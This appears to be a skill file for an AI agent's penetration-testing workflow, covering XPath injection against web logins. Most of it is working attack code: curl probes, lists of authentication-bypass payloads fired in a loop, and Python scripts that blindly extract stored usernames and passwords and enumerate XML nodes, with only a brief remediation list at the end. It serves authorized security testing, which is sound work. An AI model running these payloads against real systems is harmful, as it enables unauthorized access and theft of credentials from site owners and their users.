---
name: payload-xpath-injection
description: "XPath injection payloads and testing. Authentication bypass, boolean-based blind extraction, XML node enumeration. Triggers: 'xpath injection', 'xml query injection', 'xpath bypass', 'xpath attack', 'xml authentication bypass', 'xpath blind', 'xpath auth bypass'."
---

# XPath Injection

Exploit unsanitized input in XPath queries to bypass authentication or extract XML data.

---

## Phase 1: Detect XPath Context

```bash
TARGET_URL="https://TARGET/login"

# Detect XPath query patterns:
# (uid={input})
# //user[name/text()='{input}' and password/text()='{input}']
# /users/user[username='{input}']

# Injection test — single quote causes error:
curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username='&password=test"
# XPath error message in response = injectable

# Boolean test:
BASELINE=$(curl -s -X POST "$TARGET_URL" -d "username=invalid&password=x" -w '%{size_download}' -o /dev/null)
TRUE_TEST=$(curl -s -X POST "$TARGET_URL" -d "username=' or '1'='1&password=x" -w '%{size_download}' -o /dev/null)
echo "Baseline: $BASELINE, True: $TRUE_TEST"
# Different = injectable
```

---

## Phase 2: Authentication Bypass

```bash
TARGET_URL="https://TARGET/login"

# Auth bypass payloads (string context):
AUTH_BYPASS=(
  "' or '1'='1"
  "' or '1'='1' --"
  "' or '1'='1' #"
  "' or 1=1 or 'a'='"
  "admin' or '1'='1"
  "' or count(parent::*[position()=1])=0 or 'a'='"
  "' or count(/root/*)>0 or 'a'='"
)

# Numeric context payloads:
NUMERIC_BYPASS=(
  "1 or 1=1"
  "1 or 1"
  "0 or 1=1"
)

for payload in "${AUTH_BYPASS[@]}"; do
  echo -n "Testing: $payload → "
  result=$(curl -s -X POST "$TARGET_URL" \
    -d "username=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")&password=test")
  echo "$result" | grep -c "welcome\|dashboard\|logged in\|success"
done
```

---

## Phase 3: Blind Boolean-Based Extraction

```python
#!/usr/bin/env python3
import requests

TARGET = "https://TARGET/login"

def oracle(payload):
    """Returns True if XPath query returned valid result."""
    r = requests.post(TARGET, data={"username": payload, "password": "x"})
    return "welcome" in r.text.lower() or "success" in r.text.lower()

def get_string_length(xpath_str):
    """Get length of an XPath string result."""
    for length in range(1, 100):
        if oracle(f"' or string-length({xpath_str})={length} or 'a'='b"):
            return length
    return 0

def extract_char(xpath_str, pos):
    """Extract character at position pos from XPath string result."""
    for code in range(32, 127):
        if oracle(f"' or substring({xpath_str},{pos},1)='{chr(code)}' or 'a'='b"):
            return chr(code)
    return '?'

def extract_string(xpath_str):
    """Extract full string value from XPath expression."""
    length = get_string_length(xpath_str)
    result = ''
    for i in range(1, length + 1):
        result += extract_char(xpath_str, i)
        print(f"\r[+] {result}", end='', flush=True)
    print()
    return result

# Extract first username:
username = extract_string("//user[1]/username")
print(f"Username: {username}")

# Extract first password:
password = extract_string("//user[1]/password")
print(f"Password: {password}")

# Extract node count:
if oracle("' or count(//user)>0 or 'a'='b"):
    for n in range(1, 20):
        if oracle(f"' or count(//user)={n} or 'a'='b"):
            print(f"Total users: {n}")
            break
```

---

## Phase 4: Node Enumeration

```bash
# Enumerate XML structure via boolean injection:
python3 << 'EOF'
import requests

TARGET = "https://TARGET/login"

def oracle(payload):
    r = requests.post(TARGET, data={"username": payload, "password": "x"})
    return "welcome" in r.text.lower()

# Check root node name:
for name in ["users", "user", "root", "data", "accounts", "members"]:
    if oracle(f"' or name(/*)='{name}' or 'a'='b"):
        print(f"Root node: {name}")

# Count children of root:
for n in range(1, 20):
    if oracle(f"' or count(/*/*)={n} or 'a'='b"):
        print(f"Children: {n}")
        break

# Get child node names:
for i in range(1, 10):
    for name in ["user", "account", "member", "entry", "record"]:
        if oracle(f"' or name(//*[{i}])='{name}' or 'a'='b"):
            print(f"Node {i}: {name}")
EOF
```

---

## Remediation Reference

```
1. Use parameterized XPath queries (language-specific safe APIs)
2. Whitelist validation: usernames = alphanumeric + limited special chars
3. Escape special characters: ' → &apos;, " → &quot;
4. Never concatenate user input into XPath strings
```

---

## Output

Save to `.omop/engagement/vuln/xpath-injection/`:
- `auth-bypass.txt` — working bypass payloads
- `extracted-data.txt` — blindly extracted XML values

## Next Phase

→ `pentest-report` for final report
